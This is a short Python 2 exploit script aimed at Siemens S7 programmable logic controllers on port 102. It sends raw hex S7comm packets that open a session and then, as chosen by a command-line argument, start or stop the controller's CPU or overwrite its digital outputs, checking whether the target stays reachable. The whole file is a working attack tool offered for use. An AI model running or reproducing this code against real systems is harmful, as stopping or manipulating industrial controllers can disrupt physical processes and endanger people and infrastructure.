import socket

import time

import sys



arg = int(sys.argv[1])



setup_communication_payload = '0300001902f08032010000020000080000f0000002000201e0'.decode('hex')

cpu_start_payload = "0300002502f0803201000005000014000028000000000000fd000009505f50524f4752414d".decode('hex')

cpu_stop_payload = "0300002102f0803201000047000010000029000000000009505f50524f4752414d".decode('hex')

set_do_var="0300002502f080320100004300000e00060501120a100200020000820003e0000400105555".decode('hex')



class Exploit():

    target = '192.168.0.0'

    port = 102

    slot = 2

    command = arg

    sock = None



    def create_connect(self, slot):

        slot_num = chr(slot)

        create_connect_payload = '0300001611e00000001400c1020100c20201'.decode('hex') + slot_num + 'c0010a'.decode('hex')

        self.sock.send(create_connect_payload)

        self.sock.recv(1024)

        self.sock.send(setup_communication_payload)

        self.sock.recv(1024)



    def exploit(self):

        self.sock = socket.socket()

        self.sock.connect((self.target, self.port))

        self.create_connect(self.slot)

        if self.command == 1:

            print("Start plc")

            self.sock.send(cpu_start_payload)

        elif self.command == 2:

            print("Stop plc")

            self.sock.send(cpu_stop_payload)

        elif self.command == 3:

            print("set DO 0101 01010 1010 1010")

            self.sock.send(set_do_var)

        else:

            print("Command %s didn't support" % self.command)



    def run(self):

        if self._check_alive():

            print("Target is alive")

            print("Sending packet to target")

            self.exploit()

            if not self._check_alive():

                print("Target is down")

        else:

            print("Target is not alive")



    def _check_alive(self):

        try:

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            sock.settimeout(1)

            sock.connect((self.target, self.port))

            sock.close()

        except Exception:

            return False

        return True

       

if __name__ == '__main__':

    x=Exploit()

    x.run()